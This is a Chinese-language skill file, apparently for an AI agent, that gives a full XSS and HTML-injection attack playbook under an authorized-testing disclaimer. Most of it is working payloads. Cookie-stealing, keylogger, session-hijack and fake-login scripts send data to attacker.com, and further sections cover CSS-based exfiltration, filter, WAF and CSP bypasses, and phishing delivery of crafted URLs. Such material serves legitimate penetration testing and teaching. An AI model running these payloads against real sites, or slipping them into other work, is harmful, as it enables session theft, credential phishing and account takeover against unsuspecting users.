---
name: xss-html-injection
description: "对 Web 应用执行全面的客户端注入漏洞评估，识别 XSS 和 HTML 注入缺陷，演示会话劫持和凭据窃取等利用技术，并验证输入净化和输出编码机制。触发词：XSS、HTML 注入、跨站脚本、客户端注入、会话劫持、凭据窃取、CSP 绕过、DOM XSS、存储型 XSS、反射型 XSS、输入净化、输出编码、安全测试、漏洞评估、payload 编写、过滤绕过、WAF 绕过。"
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> 授权使用声明：本技能仅可在授权安全评估、防御性验证或受控教育环境中使用。

# 跨站脚本与 HTML 注入测试

## 目标

对 Web 应用执行全面的客户端注入漏洞评估，识别 XSS 和 HTML 注入缺陷，演示会话劫持和凭据窃取等利用技术，并验证输入净化和输出编码机制。本技能支持针对存储型、反射型以及基于 DOM 的攻击向量进行系统化的检测与利用。

## 输入 / 前置条件

### 所需访问权限
- 目标 Web 应用 URL，包含用户输入字段
- Burp Suite 或浏览器开发者工具，用于请求分析
- 创建测试账号的权限，用于存储型 XSS 测试
- 启用 JavaScript 控制台的浏览器

### 技术要求
- 了解浏览器上下文中的 JavaScript 执行机制
- 掌握 HTML DOM 结构与操作
- 熟悉 HTTP 请求/响应头
- 理解 Cookie 属性与会话管理

### 法律前置条件
- 获得书面的安全测试授权
- 明确范围，包括目标域名与功能
- 约定对任何捕获会话数据的处理方式
- 建立事件响应流程

## 输出 / 交付物

- 包含严重性分级的 XSS/HTMLi 漏洞报告
- 证明影响的漏洞利用 payload 概念验证
- 会话劫持演示（受控环境下）
- 包含 CSP 配置的修复建议

## 核心工作流

### 阶段 1：漏洞检测

#### 识别输入反射点
定位用户输入在响应中被反射的区域：

```
# 常见注入向量
- 搜索框与查询参数
- 用户资料字段（姓名、简介、评论）
- URL 片段与哈希值
- 显示用户输入的错误信息
- 仅进行客户端验证的表单字段
- 隐藏的表单字段与参数
- HTTP 头（User-Agent、Referer）
```

#### 基础检测测试
插入测试字符串，观察应用行为：

```html
<!-- 基础反射测试 -->
<test123>

<!-- script 标签测试 -->
<script>alert('XSS')</script>

<!-- 事件处理器测试 -->
<img src=x onerror=alert('XSS')>

<!-- 基于 SVG 的测试 -->
<svg onload=alert('XSS')>

<!-- body 事件测试 -->
<body onload=alert('XSS')>
```

监控以下情况：
- 未经编码的原始 HTML 反射
- 部分编码（部分字符被转义）
- 浏览器控制台中的 JavaScript 执行
- 检查器中可见的 DOM 修改

#### 判断 XSS 类型

**存储型 XSS 特征：**
- 页面刷新后输入仍然存在
- 其他用户可看到被注入的内容
- 内容存储于数据库或文件系统

**反射型 XSS 特征：**
- 输入仅在当前响应中出现
- 需要受害者点击精心构造的 URL
- 不会跨会话持久化

**基于 DOM 的 XSS 特征：**
- 输入由客户端 JavaScript 处理
- 服务器响应中不包含 payload
- 利用过程完全在浏览器内完成

### 阶段 2：存储型 XSS 利用

#### 识别存储位置
针对具有持久化用户内容的目标区域：

```
- 评论板块与论坛
- 用户资料字段（昵称、简介、所在地）
- 商品评价与评分
- 私信与聊天系统
- 文件上传元数据（文件名、描述）
- 配置设置与偏好
```

#### 构造持久化 Payload

```html
<!-- Cookie 窃取 payload -->
<script>
document.location='http://attacker.com/steal?c='+document.cookie
</script>

<!-- 键盘记录器注入 -->
<script>
document.onkeypress=function(e){
  new Image().src='http://attacker.com/log?k='+e.key;
}
</script>

<!-- 会话劫持 -->
<script>
fetch('http://attacker.com/capture',{
  method:'POST',
  body:JSON.stringify({cookies:document.cookie,url:location.href})
})
</script>

<!-- 钓鱼表单注入 -->
<div id="login">
<h2>Session Expired - Please Login</h2>
<form action="http://attacker.com/phish" method="POST">
Username: <input name="user"><br>
Password: <input type="password" name="pass"><br>
<input type="submit" value="Login">
</form>
</div>
```

### 阶段 3：反射型 XSS 利用

#### 构造恶意 URL
构建包含 XSS payload 的 URL：

```
# 基础反射型 payload
https://target.com/search?q=<script>alert(document.domain)</script>

# URL 编码 payload
https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E

# 参数中的事件处理器
https://target.com/page?name="><img src=x onerror=alert(1)>

# 基于片段（用于 DOM XSS）
https://target.com/page#<script>alert(1)</script>
```

#### 投递方式
将反射型 XSS 投递给受害者的技术：

```
1. 携带构造链接的钓鱼邮件
2. 通过社交媒体消息分发
3. 使用 URL 短链混淆 payload
4. 编码恶意 URL 的二维码
5. 通过可信域名的重定向链
```

### 阶段 4：基于 DOM 的 XSS 利用

#### 识别危险接收点（Sink）
定位处理用户输入的 JavaScript 函数：

```javascript
// 危险接收点
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
eval()
setTimeout()
setInterval()
Function()
location.href
location.assign()
location.replace()
```

#### 识别输入源（Source）
定位用户可控数据进入应用的位置：

```javascript
// 用户可控输入源
location.hash
location.search
location.href
document.URL
document.referrer
window.name
postMessage data
localStorage/sessionStorage
```

#### DOM XSS Payload

```javascript
// 基于 hash 的注入
https://target.com/page#<img src=x onerror=alert(1)>

// URL 参数注入（客户端处理）
https://target.com/page?default=<script>alert(1)</script>

// postMessage 利用
// 在攻击者页面中：
<iframe src="https://target.com/vulnerable"></iframe>
<script>
frames[0].postMessage('<img src=x onerror=alert(1)>','*');
</script>
```

### 阶段 5：HTML 注入技术

#### 反射型 HTML 注入
在不使用 JavaScript 的情况下修改页面外观：

```html
<!-- 内容注入 -->
<h1>SITE HACKED</h1>

<!-- 表单劫持 -->
<form action="http://attacker.com/capture">
<input name="credentials" placeholder="Enter password">
<button>Submit</button>
</form>

<!-- CSS 注入实现数据外泄 -->
<style>
input[value^="a"]{background:url(http://attacker.com/a)}
input[value^="b"]{background:url(http://attacker.com/b)}
</style>

<!-- iframe 注入 -->
<iframe src="http://attacker.com/phishing" style="position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
```

#### 存储型 HTML 注入
持久化的内容篡改：

```html
<!-- 滚动公告干扰 -->
<marquee>Important Security Notice: Your account is compromised!</marquee>

<!-- 样式覆盖 -->
<style>body{background:red !important;}</style>

<!-- 使用 CSS 隐藏内容 -->
<div style="position:fixed;top:0;left:0;width:100%;background:white;z-index:9999;">
Fake login form or misleading content here
</div>
```

### 阶段 6：过滤器绕过技术

#### 标签与属性变体

```html
<!-- 大小写变化 -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>

<!-- 替代标签 -->
<svg/onload=alert(1)>
<body/onload=alert(1)>
<marquee/onstart=alert(1)>
<details/open/ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- 畸形标签 -->
<img src=x onerror=alert(1)//
<img """><script>alert(1)</script>">
```

#### 编码绕过

```html
<!-- HTML 实体编码 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- 十六进制编码 -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

<!-- Unicode 编码 -->
<script>\u0061lert(1)</script>

<!-- 混合编码 -->
<img src=x onerror=\u0061\u006cert(1)>
```

#### JavaScript 混淆

```javascript
// 字符串拼接
<script>eval('al'+'ert(1)')</script>

// 模板字面量
<script>alert`1`</script>

// 构造函数执行
<script>[].constructor.constructor('alert(1)')()</script>

// Base64 编码
<script>eval(atob('YWxlcnQoMSk='))</script>

// 不使用括号
<script>alert`1`</script>
<script>throw/a]a]/.source+onerror=alert</script>
```

#### 空白与注释绕过

```html
<!-- Tab/换行插入 -->
<img src=x	onerror
=alert(1)>

<!-- JavaScript 注释 -->
<script>/**/alert(1)/**/</script>

<!-- 属性中的 HTML 注释 -->
<img src=x onerror="alert(1)"<!--comment-->
>
```

## 速查参考

### XSS 检测清单
```
1. 插入 <script>alert(1)</script> → 检查是否执行
2. 插入 <img src=x onerror=alert(1)> → 检查事件处理器
3. 插入 "><script>alert(1)</script> → 测试属性逃逸
4. 插入 javascript:alert(1) → 测试 href/src 属性
5. 检查 URL hash 处理 → DOM XSS 可能性
```

### 常见 XSS Payload

| 上下文 | Payload |
|---------|---------|
| HTML body | `<script>alert(1)</script>` |
| HTML attribute | `"><script>alert(1)</script>` |
| JavaScript string | `';alert(1)//` |
| JavaScript template | `${alert(1)}` |
| URL attribute | `javascript:alert(1)` |
| CSS context | `</style><script>alert(1)</script>` |
| SVG context | `<svg onload=alert(1)>` |

### Cookie 窃取 Payload
```javascript
<script>
new Image().src='http://attacker.com/c='+btoa(document.cookie);
</script>
```

### 会话劫持模板
```javascript
<script>
fetch('https://attacker.com/log',{
  method:'POST',
  mode:'no-cors',
  body:JSON.stringify({
    cookies:document.cookie,
    localStorage:JSON.stringify(localStorage),
    url:location.href
  })
});
</script>
```

## 约束与护栏

### 操作边界
- 不得注入可能破坏生产系统的 payload
- 仅在演示目的下收集 Cookie/会话
- 避免使用可能在非预期用户间传播的 payload（蠕虫行为）
- 不得在范围需求之外外泄真实用户数据

### 技术限制
- 内容安全策略（CSP）可能阻止内联脚本
- HttpOnly Cookie 阻止 JavaScript 访问
- SameSite Cookie 属性限制跨源攻击
- 现代框架通常自动转义输出

### 法律与道德要求
- 测试前必须获得书面授权
- 立即上报关键 XSS 漏洞
- 按数据保护协议处理捕获的凭据
- 不得利用已发现漏洞进行未授权访问

## 示例

### 示例 1：评论区的存储型 XSS

**场景**：博客评论功能存在存储型 XSS 漏洞

**检测**：
```
POST /api/comments
Content-Type: application/json

{"body": "<script>alert('XSS')</script>", "postId": 123}
```

**观察**：评论被渲染，且脚本对所有访问者执行

**利用 Payload**：
```html
<script>
var i = new Image();
i.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>
```

**结果**：每个查看该评论的用户的会话 Cookie 都会被发送到攻击者服务器。

### 示例 2：通过搜索参数实现的反射型 XSS

**场景**：搜索结果页未对查询进行编码就进行了反射

**易受攻击的 URL**：
```
https://shop.example.com/search?q=test
```

**检测测试**：
```
https://shop.example.com/search?q=<script>alert(document.domain)</script>
```

**构造的攻击 URL**：
```
https://shop.example.com/search?q=%3Cimg%20src=x%20onerror=%22fetch('https://attacker.com/log?c='+document.cookie)%22%3E
```

**投递方式**：通过钓鱼邮件将 URL 发送给目标用户。

### 示例 3：通过 Hash 片段实现的基于 DOM 的 XSS

**场景**：JavaScript 读取 URL hash 并插入到 DOM

**易受攻击的代码**：
```javascript
document.getElementById('welcome').innerHTML = 'Hello, ' + location.hash.slice(1);
```

**攻击 URL**：
```
https://app.example.com/dashboard#<img src=x onerror=alert(document.cookie)>
```

**结果**：脚本完全在客户端执行；payload 从未触达服务器。

### 示例 4：通过 JSONP 接口实现 CSP 绕过

**场景**：站点设置了 CSP，但允许受信 CDN

**CSP 头**：
```
Content-Security-Policy: script-src 'self' https://cdn.trusted.com
```

**绕过**：在受信域名上找到 JSONP 接口：
```html
<script src="https://cdn.trusted.com/api/jsonp?callback=alert"></script>
```

**结果**：利用允许的脚本源成功绕过 CSP。

## 故障排查

| 问题 | 解决方案 |
|-------|-----------|
| 脚本未执行 | 检查 CSP 是否拦截；确认编码方式；尝试事件处理器（img、svg onerror）；确认 JS 已启用 |
| Payload 显示但不执行 | 使用 `"` 或 `'` 跳出属性上下文；检查是否在注释内；测试不同上下文 |
| Cookie 不可访问 | 检查 HttpOnly 标志；尝试 localStorage/sessionStorage；使用 no-cors 模式 |
| CSP 拦截 Payload | 在白名单域名上寻找 JSONP；检查 unsafe-inline；测试 base-uri 绕过 |
| WAF 拦截请求 | 使用编码变体；对 payload 片段化；插入空字节；尝试大小写变化 |

## 何时使用
本技能适用于执行概述中描述的工作流或操作。
